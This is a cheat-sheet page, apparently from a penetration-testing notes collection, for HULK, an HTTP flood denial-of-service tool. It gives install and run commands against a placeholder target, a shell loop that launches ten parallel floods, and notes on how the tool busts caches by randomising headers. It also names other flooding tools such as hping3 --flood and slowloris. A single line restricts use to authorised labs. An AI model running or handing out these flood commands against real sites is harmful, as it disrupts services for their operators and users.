# hulk — HTTP Unbearable Load King

> **HTTP flood DoS tool.** Each request uses randomised headers, user-agent, and referer to bypass simple caches.

**Install:** `git clone https://github.com/grafov/hulk && cd hulk && go build` (or python port `hulk.py`)

---

## 🎯 Cheat-flow

```bash
# Python version
python hulk.py http://target.com/

# Go version
./hulk -site http://target.com/ -data-size 3072
```

Hulk hammers the URL forever with unique requests — stop with Ctrl+C.

---

## 🔑 Key behavior

- Randomises `User-Agent`, `Referer`, query string → cache-busting.
- Single-threaded-per-process but can be launched N times in parallel.
- Asks for `Keep-Alive`.
- No built-in rate limiting.

---

## 📋 Recipes

```bash
# 1. 10 parallel hulks
for i in $(seq 1 10); do python hulk.py http://target/ & done
wait

# 2. Against specific resource
python hulk.py http://target/search.php?q=test
```

---

## ⚠️ Gotchas

- Very noisy — any WAF / rate-limit kills it fast.
- **Only use on authorised lab targets.** DoS is illegal against real sites.
- Modern alternatives: [slowloris](slowloris.md) (low-bandwidth), `goloris`, `t50`, `hping3 --flood`.
- CloudFlare / Akamai absorb hulk trivially.

---

## 🔗 Related

- [slowloris](slowloris.md) · [loic](loic.md) · [hping3](hping3.md)
